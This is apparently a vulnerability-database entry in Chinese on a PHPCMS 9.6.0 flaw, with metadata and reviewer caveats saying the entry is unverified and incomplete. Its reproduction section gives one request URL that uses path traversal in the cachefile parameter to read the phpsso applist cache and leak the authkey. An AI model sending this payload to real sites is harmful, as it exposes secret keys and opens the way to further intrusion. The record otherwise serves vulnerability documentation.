---
source: "hatch 补库批 20260928"
product: "PHPCMS9.6.0 get_menu"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Phpcms V9.6.0 authkey泄露导致注入"
prerequisites: "来源所述条件，未列明部分仍待核：API可读跨路径缓存，Windows反斜杠适用；key=authkey含义未解"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-fd4200a1302681496ce56ab3"
entity_id: "ve-fd4200a1302681496ce56ab3"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：API可读跨路径缓存，Windows反斜杠适用；key=authkey含义未解

- **结论使用边界（1）**：标题导致注入但只有泄漏URL，无SQLi后续或响应。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **适用与权限边界（2）**：路径指phpsso applist，认证/系统auth_key与SSO authkey是否同一应区分。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

- **适用与权限边界（3）**：缺出处/修复和平台条件。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Phpcms V9.6.0 authkey泄露导致注入

一、漏洞简介
------------

二、漏洞影响
------------

Phpcms V9.6.0

三、复现过程
------------

    http://www.0-sec.org/api.php?op=get_menu&act=ajax_getlist&callback=aaaaa&parentid=0&key=authkey&cachefile=..\..\..\phpsso_server\caches\caches_admin\caches_data\applist&path=admin
